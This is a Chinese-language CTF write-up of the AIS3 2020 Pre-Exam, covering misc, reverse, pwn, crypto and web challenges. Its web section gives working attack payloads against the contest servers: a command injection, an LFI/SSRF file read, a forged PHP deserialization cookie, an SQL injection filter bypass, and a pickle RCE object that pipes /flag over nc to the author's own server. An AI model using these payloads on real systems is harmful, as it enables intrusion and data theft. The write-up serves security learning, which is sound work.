---
title: 'AIS3 PreExam 2020 Write-Up'
author: "TwinkleStar03"
tags: [AIS3 2020 Pre-Exam, Write-Up]
categories: [CTF]
date: 2020-06-20
---


AIS3 2022 PreExam 解題過程與心得。
<!--more-->

從接觸CTF到現在已經過了一年，在CTF的技術上的確進步了不少，但還有很長一段路要走呢!

結果Pwn沒解掉幾題，花大部分時間在看web...事後看了pwn的題目才發現自己解的掉...早知道就先打PwnㄉQAQ


這次解掉的題目...
- 🐧Misc
	- 💤Piquero
	- 🐥Karuego
	- 🌱Soy
	- 👑Saburo
	
- ♻️Reverse
	- 🍍TsaiBro
	- 🎹Fallen Beat

- 💥 Pwn
	- 👻 BOF

-  🙊 Crypto
	- 🦕 Brontosaurus
	- 🦖 T-Rex
	
- 🌐Web
	- 🐿️Squirrel
	- 🦈Shark
	- 🐘Elephant
	- 🐍Snake
	- 🦉Owl

---

## 🐧Misc

### 💤Piquero
盲人點字，找表找了很久，然後一個一個字慢慢對...

Flag: `AIS3{I_feel_sleepy_Good_Night!!!}`

### 🐥Karuego
拿到一張圖片: 
![Karuego.png](/images/AIS3_2020_Pre-Exam/Karuego.png)

感覺圖片裡面有放東西，先拿去binwalk...
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 2880 x 1492, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, compressed
2059568       0x1F6D30        Zip archive data, at least v1.0 to extract, name: files/
2059632       0x1F6D70        Zip archive data, encrypted at least v2.0 to extract, compressed size: 113020, uncompressed size: 113110, name: files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg
2172779       0x21276B        Zip archive data, encrypted at least v2.0 to extract, compressed size: 1087747, uncompressed size: 1092860, name: files/Demon.png
3260899       0x31C1E3        End of Zip archive, footer length: 22
```

裏頭的確有東西，`binwalk -e` extract出來，之後看到一個被鎖起來的zip，不知道怎麼找密碼就用fcrackzip把密碼炸出來，之後就拿到帶有flag的圖片。

![Demon.png](/images/AIS3_2020_Pre-Exam/Demon.png)


### 🌱Soy

拿到一張失去一部分的QRCode

![Soy.png](/images/AIS3_2020_Pre-Exam/Soy.png)

找了找網路資源找到了關於QRCode復原的[文章](https://www.robertxiao.ca/hacking/ctf-writeup/mma2015-qrcode/)，順著文章研究了QRCode的運作方式後，我用QRazyBox這個工具在上面一個一個像素點出來，之後讓他配合error Correction來把完整資訊extract出來

![QRazyBox](/images/AIS3_2020_Pre-Exam/QRazyBox.png)  

Flag: ` AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}`


### 👑Saburo
拿到一個位置，nc上去之後稍微摸索後發現: 只要送出的字串跟Flag部分相同的話就會回傳更大的時間，但是這個時間前後有點誤差，而且長度越長它誤差越大，所以我選擇多傳幾次然後取平均值來決定這個是不是正確的字元。
```
Flag: A
Haha, you lose in 26 milliseconds.
---
Flag: AI
Haha, you lose in 37 milliseconds.
---
Flag: AIS
Haha, you lose in 55 milliseconds.
```

所以我寫了一個Python腳本來幫我拼出Flag
```python
def flag_it():
    flag = 'AIS3{'
    pre_avg = 75

    while(True):
        for c in char_set:
            tmp_flag = flag + c
            avg = []
            for i in xrange(5):
                avg.append(send(tmp_flag))
            avg = sum(avg) / len(avg)
            print('Now: {}, Now_Avg: {}, Pre_Avg: {}'.format(c, avg, pre_avg))
            if avg > pre_avg:
                pre_avg = avg + 5
                flag = tmp_flag
                print('Found one char! Flag:{}'.format(flag))
                break

```

Flag: `AIS3{A1r1ght_U_4r3_my_3n3nnies}`

---

## ♻️Reverse

### 🍍TsaiBro
一開始拿到一個binary跟一個txt，binary會根據參數來印出對應的密文\
因為懶惰所以沒有去逆向那個binary，反而直接蓋一個對照表起來，最後寫個腳本把Flag找出來...

Flag: `AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}`

### 🎹Fallen Beat
拿到一個Jar做的音G，音樂動人(?

拿去餵給jd-gui去逆向來看看flag的邏輯，然後在`PanelEnding.class`裏頭找到Flag的陣列。\
繼續往下找可以找到解密Flag的邏輯，最後找到cache來對這個陣列做XOR就可以找出Flag了!\
Cache是`songs/gekkou/hell`這個看起來像是譜面的東西，實際上裏頭裝著Cache會載入的東西。
```java
byte[] flag = new byte[] { 
      89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 
      109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 
      111, 119, 111, 71, 114, 125, 68, 105, Byte.MAX_VALUE, 124, 
      94, 103, 46, 107, 97, 104 };
      
if (t == mc) {
      for (i = 0; i < cache.size(); i++)
        this.flag[i % this.flag.length] = (byte)(this.flag[i % this.flag.length] ^ ((Integer)cache.get(i)).intValue()); 
      String fff = new String(this.flag);
      this.text[0].setText(String.format("Flag: %s", new Object[] { fff }));
    } 
```

寫個腳本把Flag XOR回來。

Flag: `AIS3{Wow_how_m4ny_h4nds_do_you_h4ve}`

---

## 💥 Pwn

### 👻 BOF
有BufferOverflow的洞。

沒有在binary中找到可以直接開shell的函數，但是有`system@plt`可以用。\
在64bit下透過register傳參數，所以找個可以`pop rdi; ret`的gadget來用就可以控制system的第一個參數了。

第一個參數要求的型態是`char[]`，直接填`"/bin/sh"`是沒辦法getshell的，在binary中有找到一個可以寫的.bss區域，配合`gets@plt`就可在那個位置寫`"/bin/sh"`，最後把該位置當參數傳給`system`就可以getshell了。

---

## 🙊 Crypto

### 🦕 Brontosaurus
恩...JSFuck，倒轉然後拿去console跑

Flag: ``

### 🦖 T-Rex
給了對照表，直接Find+Replace把flag還原出來。

Flag: `AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}`

---

## 🌐Web

### 🐿️Squirrel
進到`https://squirrel.ais3.org/`看到一堆松鼠，翻了翻網頁找到了這段Javascript:
```js
<script>
    const squirrelFile = '/etc/passwd';

    fetch('api.php?get=' + encodeURIComponent(squirrelFile))
      .then(res => res.json())
      .then(data => {
        if ('error' in data) {
          throw data.error;
        }
        data.output.split('\n')
          .map(line => line.split(':')[0].trim())
          .filter(name => name.length)
          .forEach(name => new Squirrel(name).update());
      })
      .catch(err => {
        console.log(err);
        alert('Something went wrong! Please report this to the author!');
      });
  </script>
```

找到了一個會列出檔案的網頁: `https://squirrel.ais3.org/api.php`然後用`?get`來傳要列出的檔案，感覺可以做到arbritrary file read，所以就先看看能不能列出`api.php`它自己。
```js
<?php

header('Content-Type: application/json');

if ($file = @$_GET['get']) {
    $output = shell_exec("cat '$file'");
    
    if ($output !== null) {
        echo json_encode([
            'output' => $output
        ]);
    } else {
        echo json_encode([
            'error' => 'cannot get file'
        ]);
    }
} else {
    echo json_encode([
        'error' => 'empty file path'
    ]);
}
```

洩漏完原碼後發現有command injection的洞，所以就構造了`?get='; ls /'`先對root做ls，得到以下內容。
```
5qu1rr3l_15_4_k1nd_0f_b16_r47.txt
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

那個`5qu1rr3l_15_4_k1nd_0f_b16_r47.txt`看起來像Flag，所以就送`?get=/5qu1rr3l_15_4_k1nd_0f_b16_r47.txt`讀看看，就拿到Flag了。

Flag: `AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}`

### 🦈Shark
進到網頁後看到有個Hint可以點，Hint說Flag在某個內部伺服器，順便發現Hint是用`?path=`讀出來的，感覺有LFI的漏洞可以用...\
所以就直接輸入`?path=index.php`看看能不能看到原始碼。

成功洩漏原碼後看到這段，過濾了一些符號，但還是可以用`file://`進行繞過來任意讀檔。
```php
<?php

    if ($path = @$_GET['path']) {
        if (preg_match('/^(\.|\/)/', $path)) {
            // disallow /path/like/this and ../this
            die('<pre>[forbidden]</pre>');
        }
        $content = @file_get_contents($path, FALSE, NULL, 0, 1000);
        die('<pre>' . ($content ? htmlentities($content) : '[empty]') . '</pre>');
    }

?>
```

因為說Flag運行在內部的伺服器內，所以我構造`?path=file:///proc/self/net/fib_trie`去讀了網路樹狀圖(?
```
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.22.0.0/16 2 0 2
        +-- 172.22.0.0/30 2 0 2
           |-- 172.22.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.22.0.3
              /32 host LOCAL
        |-- 172.22.255.255
           /32 link BROADCAST
```

看了下IP，就從127.22.0.0開始找，然後用`?path=http://172.22.0.1/flag`來讀，沒多久就在127.22.0.2找到Flag。

Flag: `AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}`

### 🐘Elephant
網頁有個可以輸入name的地方，先隨便打一些東西之後登入，然後就在網頁內找到一個提示`You may want to read the source code.`，所以就先朝著找原碼為目標前進。

試了一些方法，試到了`/.git/HEAD`的時候發現可以用GitHack來洩漏原碼。
進行洩漏得到了以下的程式碼:
```php
<?php
const SESSION = 'elephant_user';
$flag = file_get_contents('/flag');

class User {
    public $name;
    private $token;

    function __construct($name) {
        $this->name = $name;
        $this->token = md5($_SERVER['REMOTE_ADDR'] . rand());
    }

    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}

if (isset($_GET['logout'])) {
    header('Location: /');
    setcookie(SESSION, NULL, 0);
    exit;
}

$user = NULL;

if ($name = $_POST['name']) {
    $user = new User($name);
    header('Location: /');
    setcookie(SESSION, base64_encode(serialize($user)), time() + 600);
    exit;
} else if ($data = @$_COOKIE[SESSION]) {
    $user = unserialize(base64_decode($data));
}

?>
```

可以發現有個User類別，而輸入的Name會被儲存在裡面，然後如果token跟Flag一樣的話就會印出Flag，然後這個User會被serialize後存在Cookie內，如果Cookie裏頭已經有內容的話則會拿出來Unserialze，所以User內的資料是可以被控制的!

觀察一下後在strcmp發現了弱比較的露洞。  
如果放進去的是兩個String，那回傳值只有`>0, <0, ==0`，可是放入其他不是String的東西的時候會回傳`NULL`。  
而`strcmp($flag, $this->token) == 0`用弱比較來檢查，所以`NULL`會被視為`0`，那這個驗證就可以被繞過啦。

我寫了一段php來產出最終的payload
```php
<?php
class User {
    public $name;
    private $token;

    function __construct($name) {
        $this->name = $name;
        $this->token = array('A', 'B');
    }

    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}

$user = new User('TwinkleStar03');
echo(base64_encode(serialize($user)));
?>

> Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6MTM6IlR3aW5rbGVTdGFyMDMiO3M6MTE6IgBVc2VyAHRva2VuIjthOjI6e2k6MDtzOjE6IkEiO2k6MTtzOjE6IkIiO319
```
最後把這段b64放到Cookie上，然後重整頁面Flag就出來了!

Flag: `AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}`

### 🐍Snake
這題一進到網頁就給出了Code
```python
from flask import Flask, Response, request
import pickle, base64, traceback

Response.default_mimetype = 'text/plain'

app = Flask(__name__)

@app.route("/")
def index():
    data = request.values.get('data')
    
    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)
            
            if data and not data:
                return open('/flag').read()

            return str(data)
        except:
            return traceback.format_exc()
        
    return open(__file__).read()
```

是一題Python序列化的題目，看到題目的當下我想到之前有看過可以濫用`pickle.loads`去達到RCE的文章，所以就先朝著這個目標前進。

原本想要試試看能不能讓他彈一個ReverseShell回來，不過不知道為什麼都不成功，所以最後只讓他可以印出Flag。

最後採用把flag cat出來之後回傳給自己的伺服器。
```python
class BadObj:
    def __reduce__(self):
        import os
        return os.system, ('cat /flag | nc <My Server> 5555;',)
```

Flag: `AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck}`

### 🦉Owl
網頁就是個帳號密碼的登入介面，然而有個提示說: `UESS THE STUPID USERNAME / PASSWORD`，所以就先試試看常見的弱帳密來登入，發現可以用`admin/admin`來登入。

原本以為登入之後沒有東西了，結果上面有個Show hint的按鈕藏在上端。

Hint就是網頁的原碼:
```php
<?php

    if (isset($_GET['source'])) {
        highlight_file(__FILE__);
        exit;
    }

    // Settings
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    date_default_timezone_set('Asia/Taipei');
    session_start();

    // CSRF
    if (!isset($_SESSION['csrf_key']))
        $_SESSION['csrf_key'] = md5(rand() * rand());
    require_once('csrf.php');
    $csrf = new Csrf($_SESSION['csrf_key']);


    if ($action = @$_GET['action']) {
        function redirect($path = '/', $message = null) {
            $alert = $message ? 'alert(' . json_encode($message) . ')' : '';
            $path = json_encode($path);
            die("<script>$alert; document.location.replace($path);</script>");
        }

        if ($action === 'logout') {
            unset($_SESSION['user']);
            redirect('/');
        }
        else if ($action === 'login') {
            // Validate CSRF token
            $token = @$_POST['csrf_token'];
            if (!$token || !$csrf->validate($token)) {
                redirect('/', 'invalid csrf_token');
            }

            // Check if username and password are given
            $username = @$_POST['username'];
            $password = @$_POST['password'];
            if (!$username || !$password) {
                redirect('/', 'username and password should not be empty');
            }

            // Get rid of sqlmap kiddies
            if (stripos($_SERVER['HTTP_USER_AGENT'], 'sqlmap') !== false) {
                redirect('/', "sqlmap is child's play");
            }

            // Get rid of you
            $bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--'];
            $username = str_ireplace($bad, '', $username);
            $username = str_ireplace($bad, '', $username);

            // Auth
            $hash = md5($password);
            $row = (new SQLite3('/db.sqlite3'))
                ->querySingle("SELECT * FROM users WHERE username = '$username' AND password = '$hash'", true);
            if (!$row) {
                redirect('/', 'login failed');
            }

            $_SESSION['user'] = $row['username'];
            redirect('/');
        }
        else {
            redirect('/', "unknown action: $action");
        }
    }

    $user = @$_SESSION['user'];
```

看起來是個SQLi的題目，但是前面過濾了一些會用到的關鍵字，還過濾兩次，但其實是可以被繞過的!  
比方說`union`，如果我把關鍵字做成`unoorrion`，第一次過濾後會變成`unorion`再經過一次之後會變成`union`就變成合法的關鍵字了! 每個關鍵字都可以透過這種方法來繞過! 

但空白也會被過濾掉，但是其實可以透過`/`來代替空白，代替完的Query還是合法的!

最終Query: `'/oorr**oorr/unoorrion/oorr**oorr/all/oorr**oorr/selecoorrt/oorr**oorr/1,group_concat(value),2/oorr**oorr/frfrfromomom/oorr**oorr/garbage/oorr*`

Flag: `AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c}`